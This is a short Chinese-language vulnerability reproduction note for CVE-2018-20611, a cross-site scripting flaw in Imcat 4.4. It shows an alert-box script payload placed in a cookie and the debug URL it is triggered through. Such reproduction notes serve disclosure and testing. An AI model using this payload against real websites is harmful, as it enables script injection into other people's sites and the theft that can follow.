# （CVE-2018-20611）Imcat 4.4 xss

> 原文：[https://www.zhihuifly.com/t/topic/2976](https://www.zhihuifly.com/t/topic/2976)

# （CVE-2018-20611）Imcat 4.4 xss

## 一、漏洞简介

imcat是一套基于PHP的开源建站系统。 imcat 4.4版本存在跨站脚本漏洞。远程攻击者可通过向root/tools/adbug/binfo.php?cookie URI发送特制的cookie利用该漏洞注入任意的Web脚本或HTML。

## 二、漏洞影响

imcat 4.4

## 三、复现过程

将cookie的值修改成

```
"><script>alert(1)</script> 
```

![](img/841b6d0af7ed1e66c899bca37d6e664e.png)

然后访问

```
http://www.0-sec.org/root/tools/adbug/binfo.php?cookie` 
```

![](img/841b6d0af7ed1e66c899bca37d6e664e.png)

## 参考链接

> https://github.com/AvaterXXX/CVEs/blob/master/imcat.md